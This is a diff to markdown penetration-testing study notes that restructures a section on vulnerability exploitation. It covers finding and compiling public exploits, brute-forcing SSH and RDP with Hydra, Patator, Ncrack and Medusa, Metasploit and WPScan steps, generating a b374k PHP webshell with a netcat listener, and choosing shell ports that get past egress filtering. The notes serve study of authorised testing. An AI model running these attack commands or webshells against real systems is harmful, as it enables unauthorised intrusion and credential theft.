@@ -46,6 +46,13 @@
 ### 4.5 [ Scan Analysis at the Local Network Level ](#4.5)
 ### 4.6 [ Websites for vulnerability check ](#4.6)
 #
+# 5. [  Vulnerability Exploitation  ](#5.0)
+### 5.1 [ Goal ](#5.1)
+### 5.2 [  Exploitation ](#5.2)
+### 5.3 [  Remote Password Attack ](#5.3)
+### 5.4 [  Exploit Framework ](#5.4)
+### 5.5 [ Payload ](#5.5)
+#
 # <a name="1"></a>1. vulnerability 
 ## <a name="0"></a>Brief discussion on " What is Vulnerability ?"
 - Which violates the product.
@@ -927,268 +934,250 @@
 	* DefensesMatch to available exploits	Not all exploits successfully attack all vulnerable targets.
 	* Zero-day exploits are ideal.
 
-**	EXPLOIT
+# <a name="5.0"></a>5. Vulnerability Exploitation 
 
-		Goals:
-			Discuuss validation of vulnerabilities
-			Review exploit site
-			Identify vector attack
-			Explore exploit frameworks
+## <a name="5.1"></a>5.1 Goals:
+* Discuuss validation of vulnerabilities
+* Review exploit site
+* Identify vector attack
+* Explore exploit frameworks
 
-		Reality 
-			We have to have vulnerabilities
-			Without them there iss no hack
-			The goood news is all systems have some sort of flaws
-			There are many exploit references and to get deep inot it requires some form of code uunderstanding
-				This takes time
-				Not all want to get that deep into it
-				Use frameworks etc
-		
-		operating System
-			There will still be flaws and bugs in any OS
-			Fewer of them as time passes
-			Windows Server 2016 is pretty tight
-			Identify the attack surface and see the best fit
-		
-		Exploitation
-			Validation of vulnerabilities
-			Compromise the victim
-				Use vulnerabilities that were discovered during the methodology
-					Not all vulnerabilities will be exploitable
-			Deliver the payload
-				Once the civtim is compromised what should happen
-					Leave a record proving access
-					Grab files, plant a keystroke logger, crack passwords etc
-			From this point of access
-				Footprint and enumerate other systems
-				Remember the rules of engagement (how much we can do after getting into machines)
-		Exploit Targets
-			Exploits are highley specific
-			Have to know the build and revision number 
-				Windows
-					Service packe
-				Linux/Unix
-					Kernel Data
-			In Metasploit view with show targets
-		
-		Data Collection
-			Collect enough data to 
-				Discover potential vulnerabilities
-					Banners of the services
-						SSMTP
-						SSH
-						HTTP/HTTPS
-						FTP
-						POP3
-						
-					OS identification
-				Choose the approptriate exploit to match the target
-					Not an exact science
-				Narrow the field of attack vectors
-					Highest privilege result is preferred
-				
-		Finding Exploits
-			We need to find exploits
-			Most vulnerability lists do not post exploits
-				Except for bugtraq
-			Can use http://seclists.org/
-				A complete listing of security sites and feeds
-			Ideal exploits are prooof of concept (POC)
-			Once you get the exploit
-				Have to review it
-					could be a trojan horrse or other form of malware
-					Rarely documented
-					Require compilers or interpreters
-					May not work
-				Thoroughly test ie in a lab before deployment
-			
-			Exploit db
-				
-				www.exploit-db.com
-					commonly have 0day exploits
-									gnucitizen.org
-				tposite.com/goto/securityvulns.com
-				packerstormsecurity.com
-				searchsploit kali tool
-					[searchsploit shellshock remote]
-					[searchsploit samba remote] (which version should work)
-					
-			Manual exploitation
-				->	Nmap (gain information about target) 
-				->	sslscan ip_address
-				-> man smbclient (for samba smbclient -L ip_address)
-				-> [searchsploit samba remote]
-				-> cd into the path of exploit of version
-				-> cp the file 
-				-> gcc exploit.c -o samba
-				-> ./samba -b -v ip_address
-				
-			
-			If it is a compiled languuage
-				Look for the readme file
-				Is there a configure file
-					./configure
-					make
-					make install
-					make clean
-				Compile the rest
-					gcc -o <executable> <source>
-			Scripting language
-				Load the code in an interpreter and test it
-				Always test in a lab or sandboxed environment
-				Analyze it at hte packet level
-			
-			Full Disclouser
-				We need to frequent the lists that are full disclosure.
-					http://seclists.org/fulldisclosure
-					
-				Location of the attacker
-					Remote is preferred
-					Local can be used for internal testing or when we gain access via a remote vector ;)
-				Are exploits available
-					Is it ina a framework or have to build the code
-				Impact of the exploit
-					Denial of service are not much use
-				Complexity
-				
-			Location 
-				Remote
-					Network is reachable - As mentioned is ideal
-				Local
-					Physical
-						At the host machine
-				Subnet
-					Present on the same subnet (man in the middle)
-				Intranet
-					Inside the internet firewall
-					
-			Complexity
-				Coding skills
-					C
-					Java
-					PhP
-					others
-				State
-				Decryption or decoding required
-			Auuthentication
-				Is it required
-				Data Analysis should reveal potentaiila password attack vectors
-					ssh
-					smb
-					rdp
-				Most web apps need authentication
-				
-			Have you ever cnfigured a arouter and made a mistake
-			We can always get access because of admin errors
-			Services can be brute forced
+* Reality 
+	* We have to have vulnerabilities
+	* Without them there is no hack
+	* The goood news is all systems have some sort of flaws
+	* There are many exploit references and to get deep into it requires some form of code understanding.
+		* This takes time
+		* Not all want to get that deep into it
+		* Use frameworks etc
 
-			Remote Password Attack
-				Hydra is the tool of choice 
-					Can attack most of the desired services
-					[hydra -e nsr -L sqlmap.txt ip_address ssh -t 4]
-					[hydra -l username -P rocku.txt ip_address <protocol>] 
-					[hydra -l username -P roockyou.txt ip_address <protocol>]l=user; P=password list
-					[hydra ]
-					[hydra ]
-					[hydra ]
-					[hydra ]
-					[hydra ]
-				Patator
-					[patator ssh_login host=ip_address user=root password=FILE0 0=/rocku.txt]
-					[patator ssh_login host=ip_address user=username password=FILE0 0=rockyou.txt]
-					
-				Ncrack (Faster)
-					[ncrack -v --user sys -P /rocku.txt ssh://ip_address]
-				
-				Medusa [parallel and fast]
-					[medusa -h ip_address -u root -P rocku.txt -M ssh]
-						[-U = use a file]
-				
-					[medusa -h ip_address -u administrator -P rocku.txt -M rdp]
-				
-				Rdesktop
-					rdesktop -u administrator -p password ip_address
-					(We can see the remote desktop using this command)
-				
-				Whatweb	
-					[whatweb http://ip_address](Tells about the cms or tech used by the domain)
-				
-				wp_scan
-					[wpscan --url http://<ip_address> --enumerate u]
-					[wpscan --url http://<ip_address> --enumerate vp] (find the vulnerability)
-					Example:
-						After finding the vulnerabilities
-						-> use exploit/name
-						->set RHOST <victim ip address>\r
-						->set TARGETURI /<directory>\r
-						->exploit
-				
-				WebShell(b374k-master)
-					[php -f index.php -- -o myshell.php =p password --ess -c 9]
-					
-				-> upload the file
-				-> nc -l -v -p 13123
-				-> server run php command 
-				
-			Exploit Framework
-				Metasploit
-					Scanning auxiliary modules for webappps
-					[db_nmap -A ip_address]
-					[services -p 22]
-					[search exploit]
-					-> nikto -h ip_address
-					[use exploit/name]
-					[show options]
-					[set RHOST]
-					[set RPORT]
-				Canvas
-				CoreImapact
-			
-				Armitage/cobalt strike {Ultra Crazy Tool}
-					Detect OS
-					attack -> Find attack search exploit for exploit and hail marry for every possible exploit
-					
-			
-			Payload
-				There are extensive number of payloads
-				meterprester shellshock
-					Ability to grab password files
-					might not be successful
-					when the payload fails
-						select another
-							Generic bind shell is usually easiest
-							
-			Shell Options
-				change port from 4444
-				Change it to something else
-					NTP
-						123
-				Want a port that is not proxied and can egress out
-					Makes 80 etc bad choices in most cases
-				set lport 123, 80 , 8080
-				Required 
-				
-			SET
-				setoolkit (without going FUD)
-			->	4 ->  1 ->LHOST -> PORT
-				
-					
-		Compromise the victim
-			Use discovered or likely vulnerablities
-			Employ a valid vector
-		Deliver the payload
-			Once the victim is compromised, what should happen?
-				Additional enumeration
-					pilfering
-		From this point of access
-			Footprint and enumerate other systems
-			Remember the rules of engagement
-			Perform local assessment
-				[netstat -an]
-				[net start]
-				
-**  POST Exploitation
+* Operating System
+	* There will still be flaws and bugs in any OS
+	* Fewer of them as time passes
+	* Windows Server 2016 is pretty tight
+	* Identify the attack surface and see the best fit
+
+##  <a name="5.2"></a>5.2 Exploitation 
+* Validation of vulnerabilities
+* Compromise the victim
+	* Use vulnerabilities that were discovered during the methodology
+		* Not all vulnerabilities will be exploitable
+* Deliver the payload
+	* Once the civtim is compromised what should happen
+		* Leave a record proving access
+		* Grab files, plant a keystroke logger, crack passwords etc
+* From this point of access
+	* Footprint and enumerate other systems
+	* Remember the rules of engagement (how much we can do after getting into machines)
+* Exploit Targets
+* Exploits are highley specific
+* Have to know the build and revision number 
+	* Windows
+		* Service packe
+	* Linux/Unix
+		* Kernel Data
+* In Metasploit view with show targets
+
+* Data Collection
+* Collect enough data to 
+	* Discover potential vulnerabilities
+		* Banners of the services
+			* SSMTP
+			* SSH
+			* HTTP/HTTPS
+			* FTP
+			* POP3
+		* OS identification
+	* Choose the approptriate exploit to match the target
+		* Not an exact science
+	* Narrow the field of attack vectors
+		* Highest privilege result is preferred
+* Finding Exploits
+* We need to find exploits
+* Most vulnerability lists do not post exploits
+	* Except for bugtraq
+* Can use http://seclists.org/
+	* A complete listing of security sites and feeds
+* Ideal exploits are prooof of concept (POC)
+* Once you get the exploit
+	* Have to review it
+		* could be a trojan horrse or other form of malware
+		* Rarely documented
+		* Require compilers or interpreters
+		* May not work
+	* Thoroughly test ie in a lab before deployment
+
+* Exploit db
+	* [Exploit Database](www.exploit-db.com)
+		* commonly have 0day exploits
+		* [GNU Citizen](gnucitizen.org)
+		* [Top site vulnerability](tposite.com/goto/securityvulns.com)
+		* (Sell Code Database)[packerstormsecurity.com]
+	* searchsploit kali tool
+		* `searchsploit shellshock remote`
+		* `[searchsploit samba remote` 
+* Manual exploitation
+	* Nmap (gain information about target) 
+	* `sslscan ip_address`
+	* man smbclient (for samba smbclient -L ip_address)
+	* `searchsploit samba remote`
+	* `cd into the path of exploit of version`
+	* `cp the file` 
+	* `gcc exploit.c -o samba`
+	* `./samba -b -v ip_address`
+
+* If it is a compiled languuage
+	* Look for the readme file
+	* Is there a configure file
+		* `./configure`
+		* `make`
+		* `make install`
+		* `make clean`
+	* Compile the rest
+		* gcc -o <executable> <source>
+* Scripting language
+	* Load the code in an interpreter and test it
+	* Always test in a lab or sandboxed environment
+	* Analyze it at hte packet level
+* Full Disclouser
+	* We need to frequent the lists that are full disclosure.
+		[SecList Full Disclosure](http://seclists.org/fulldisclosure)
+	* Location of the attacker
+		* Remote is preferred
+		* Local can be used for internal testing or when we gain access via a remote vector ;)
+	* Are exploits available
+		* Is it ina a framework or have to build the code
+	* Impact of the exploit
+		* Denial of service are not much use
+	* Complexity
+* Location 
+	* Remote
+		* Network is reachable - As mentioned is ideal
+	* Local
+		* Physical
+			* At the host machine
+	* Subnet
+		* Present on the same subnet (man in the middle)
+	* Intranet
+		* Inside the internet firewall
 		
+* Complexity
+	* Coding skills
+		* C
+		* Java
+		* PhP
+		* others
+	* State
+	* Decryption or decoding required
+* Authentication
+	* Is it required
+	* Data Analysis should reveal potentaiila password attack vectors
+		* SSH
+		* SMB
+		* RDP
+	* Most web apps need authentication.
+* Quick questions:
+	* Have you ever configured a a router and made a mistake
+	* We can always get access because of admin errors
+	* Services can be brute forced
+
+##  <a name="5.3"></a>5.3 Remote Password Attack
+* Hydra is the tool of choice 
+	* Can attack most of the desired services
+	* `hydra -e nsr -L sqlmap.txt ip_address ssh -t 4`
+	* `hydra -l username -P rocku.txt ip_address <protocol>`
+	* `hydra -l username -P roockyou.txt ip_address <protocol>`
+* Patator
+	* `patator ssh_login host=ip_address user=root password=FILE0 0=/rocku.txt`
+	* `patator ssh_login host=ip_address user=username password=FILE0 0=rockyou.txt`
+	
+* Ncrack (Faster)
+	* `ncrack -v --user sys -P /rocku.txt ssh://ip_address`
+
+* Medusa `parallel and fast]
+	* `medusa -h ip_address -u root -P rocku.txt -M ssh`
+		`-U = use a file`
+
+	`medusa -h ip_address -u administrator -P rocku.txt -M rdp`
+
+* Rdesktop
+	* We can see the remote desktop using this command.
+		* rdesktop -u administrator -p password ip_address.
+* Whatweb	
+	* `whatweb http://ip_address`(Tells about the cms or tech used by the domain)
+* wp_scan
+	* `wpscan --url http://<ip_address> --enumerate u`
+	*  Find the vulnerability
+		* `wpscan --url http://<ip_address> --enumerate vp`
+	* Example:
+		* After finding the vulnerabilities
+			* `use exploit/name`
+			* `set RHOST <victim ip address>\r`
+			* `set TARGETURI /<directory>\r`
+			* `exploit`
+
+* WebShell
+	* b374k Shell 
+		* `php -f index.php -- -o myshell.php =p password --ess -c 9`
+		* Upload the file.
+		* `nc -l -v -p 13123`
+		* `server run php` 
+
+##  <a name="5.4"></a>5.4 Exploit Framework
+* Metasploit
+	* Scanning auxiliary modules for webapps
+	* ` db_nmap -A ip_address`
+	* ` services -p 22`
+	* ` search exploit`
+	* ` nikto -h ip_addres`
+	* ` use exploit/name`
+	* ` show options`
+	* ` set RHOST`
+	* ` set RPORT`
+* Canvas
+* CoreImapact
+
+* Armitage/cobalt strike {Ultra Crazy Tool}
+	* Detect OS
+	* attack -> Find attack search exploit for exploit and hail marry for every possible exploit
+
+##  <a name="5.5"></a>5.5 Payload
+* There are extensive number of payloads
+* Meterpreter shellshock
+	* Ability to grab password files
+	* Might not be successful
+	* When the payload fails
+		* Select another
+			* Generic bind shell is usually easiest
+* Shell Options
+	* change port from 4444
+	* Change it to something else
+		* NTP
+			* `123`
+	* Want a port that is not proxied and can egress out
+		* Makes 80 etc. bad choices in most cases
+	* `set lport 123, 80 , 8080`
+	* `Required` 
+
+* SET
+	* setoolkit (without going FUD)
+	* `->	4 ->  1 ->LHOST -> PORT`
+
+* Compromise the victim
+* Use discovered or likely vulnerabilities.
+* Employ a valid vector
+* Deliver the payload
+* Once the victim is compromised, what should happen?
+	* Additional enumeration
+		* Pilfering
+* From this point of access
+* Footprint and enumerate other systems
+* Remember the rules of engagement
+* Perform local assessment
+	* `netstat -an`
+	* `net start`
+
+#  POST Exploitation	
 		Goals:
 			Identify the procedure for exfiltraring data after initial compromise
 			Explore privilege escalation on different platforms
